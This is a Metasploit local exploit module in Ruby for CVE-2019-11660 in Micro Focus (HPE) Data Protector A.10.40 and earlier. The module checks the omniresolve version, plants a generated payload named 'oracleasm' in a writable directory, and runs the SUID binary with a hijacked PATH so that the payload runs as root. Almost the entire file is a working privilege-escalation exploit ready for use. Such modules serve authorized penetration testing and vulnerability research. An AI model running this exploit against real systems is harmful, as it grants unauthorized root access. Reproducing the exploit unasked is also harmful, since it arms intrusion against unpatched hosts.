##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Micro Focus (HPE) Data Protector SUID Privilege Escalation',
      'Description'    => %q{
        This module exploits the trusted `$PATH` environment
        variable of the SUID binary `omniresolve` in
        Micro Focus (HPE) Data Protector A.10.40 and prior.

        The `omniresolve` executable calls the `oracleasm` binary using
        a relative path and the trusted environment `$PATH`, which allows
        an attacker to execute a custom binary with `root` privileges.

        This module has been successfully tested on:
        HPE Data Protector A.09.07: OMNIRESOLVE, internal build 110, built on Thu Aug 11 14:52:38 2016;
        Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 118, built on Tue May 21 05:49:04 2019 on CentOS Linux release 7.6.1810 (Core)

        The vulnerability has been patched in:
        Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 125, built on Mon Aug 19 19:22:20 2019
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          's7u55', # Discovery and Metasploit module
        ],
      'DisclosureDate' => '2019-09-13',
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        =>
        [
          [
            'Micro Focus (HPE) Data Protector <= 10.40 build 118',
            upper_version: Gem::Version.new('10.40')
          ]
        ],
      'DefaultOptions' =>
        {
          'PrependSetgid' => true,
          'PrependSetuid' => true
        },
      'References'     =>
        [
          [ 'CVE', '2019-11660' ],
          [ 'URL', 'https://softwaresupport.softwaregrp.com/doc/KM03525630' ]
        ]
    ))

    register_options(
      [
        OptString.new('SUID_PATH', [ true, 'Path to suid executable omniresolve', '/opt/omni/lbin/omniresolve' ])
      ])

    register_advanced_options(
      [
        OptBool.new('ForceExploit', [ false, 'Override check result', false ]),
        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
      ])
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def suid_bin_path
    datastore['SUID_PATH'].to_s
  end

  def check
    unless setuid? suid_bin_path
      vprint_error("#{suid_bin_path} executable is not setuid")
      return CheckCode::Safe
    end

    info = cmd_exec("#{suid_bin_path} -ver").to_s
    if info =~ /(?<=\w\.)(\d\d\.\d\d)(.*)(?<=build )(\d\d\d)/
      version = '%.2f' % $1.to_f
      build = $3.to_i
      vprint_status("omniresolve version #{version} build #{build}")

      unless Gem::Version.new(version) < target[:upper_version] ||
             (Gem::Version.new(version) == target[:upper_version] && build <= 118)
        return CheckCode::Safe
      end

      return CheckCode::Appears
    end

    vprint_error("Could not parse omniresolve -ver output")
    CheckCode::Detected
  end

  def exploit
    if check == CheckCode::Safe
      unless datastore['ForceExploit']
        fail_with(Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.')
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    if is_root?
      unless datastore['ForceExploit']
        fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
      end
    end

    unless writable?(base_dir)
      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
    end

    payload_path = File.join(base_dir, 'oracleasm')
    register_file_for_cleanup(payload_path)
    write_file(payload_path, generate_payload_exe)
    chmod(payload_path)

    trigger_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))
    register_file_for_cleanup(trigger_path)
    write_file(trigger_path, "#{rand_text_alpha(5..10)}:#{rand_text_alpha(5..10)}")
    cmd_exec("env PATH=\"#{base_dir}:$PATH\" #{suid_bin_path} -i #{trigger_path} & echo ")
  end
end
            
